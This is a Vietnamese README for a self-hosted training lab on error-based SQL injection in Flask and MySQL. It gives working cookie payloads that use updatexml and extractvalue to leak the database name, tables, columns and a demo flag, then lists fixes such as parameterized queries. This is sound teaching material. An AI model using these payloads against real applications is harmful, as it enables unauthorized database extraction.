# Lab: Error‑Based SQLi (Flask + MySQL + Docker)
## Cách build & chạy
```bash
# 1) Khởi động
docker compose up -d --build

# 2) Mở trình duyệt
#   http://127.0.0.1:5000
# Trang sẽ tự set cookie TrackingId=abc123 cho lần đầu.
```

---

## Khai thác Error‑Based SQLi (MySQL)
**Ý tưởng:** chèn payload vào cookie **TrackingId** để làm vỡ cú pháp (sinh lỗi) hoặc gọi các hàm tạo lỗi có chứa dữ liệu (ví dụ `updatexml` / `extractvalue`), từ đó dữ liệu xuất hiện trong **thông báo lỗi** MySQL (hiển thị trên trang lab).

### Gây lỗi cú pháp để “soi” truy vấn
- Đặt cookie: `abc123'`  → **lỗi** *You have an error in your SQL syntax…*
  - Thấy lab in ra cả **Last SQL** và **MySQL error** → đã đủ điều kiện khai thác kiểu error‑based.

### Bình thường hoá truy vấn (comment phần còn lại)
- Đặt cookie: `abc123' -- -`
  - Nếu không còn lỗi cú pháp, chứng tỏ bạn đã đóng được chuỗi và comment phần đuôi.

> Từ đây, ta có thể chèn biểu thức trong mệnh đề `WHERE`, ví dụ `' AND <payload> -- -`

### Lộ **tên CSDL hiện tại** qua lỗi `updatexml`
```
abc123' AND updatexml(1, concat(0x7e, database(), 0x7e), 1) -- -
```
- Kết quả (trong **MySQL error**): dạng `XPATH syntax error: '~sqli_lab~'` ⇒ lộ **database = sqli_lab**.

### Liệt kê **tên bảng** trong DB hiện tại
```
abc123' AND updatexml(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e), 1) -- -
```
- Kết quả lỗi sẽ chứa: `~users,flags~` (đã lộ 2 bảng).

### Liệt kê **cột** của bảng `flags`
```
abc123' AND updatexml(1, concat(0x7e, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='flags'), 0x7e), 1) -- -
```
- Sẽ thấy: `~id,flag~`.

### Lấy **FLAG** (từ bảng `flags`)
```
abc123' AND updatexml(1, concat(0x7e, (SELECT flag FROM flags), 0x7e), 1) -- -
```
- Lỗi trả về sẽ chứa: `~FLAG{demo_error_based_sqli_lab}~`

> Gợi ý: Nếu lỗi bị cắt ngắn, có thể `LIMIT` hoặc tách nhiều lần (substr/limit offset).
```
abc123' AND updatexml(1, concat(0x7e, (SELECT flag FROM flags LIMIT 0,1), 0x7e), 1) -- -
```

### Một vài biến thể
- Dùng `extractvalue(1, concat(...))` (MySQL ≤ 5.7; đã deprecated nhưng nhiều môi trường demo còn dùng):
```
abc123' AND extractvalue(1, concat(0x7e, user(), 0x7e)) -- -
```

---

## Hậu kiểm & vá lỗi
- **Không ghép chuỗi** cho câu lệnh SQL. Dùng **parameterized queries**:
  ```python
  cur.execute("SELECT username FROM users WHERE tracking_id = %s", (tracking_id,))
  ```
- **Ẩn thông báo lỗi chi tiết** ở môi trường production. Log nội bộ thay vì hiển thị trên UI.
- **WAF/validation**: ràng buộc pattern cookie (base64/uuid), giới hạn độ dài, từ chối ký tự nguy hiểm.
- **Nguyên tắc ít tiết lộ**: UI chỉ hiển thị thông báo chung chung, không in câu SQL hay lỗi DB cụ thể.

---

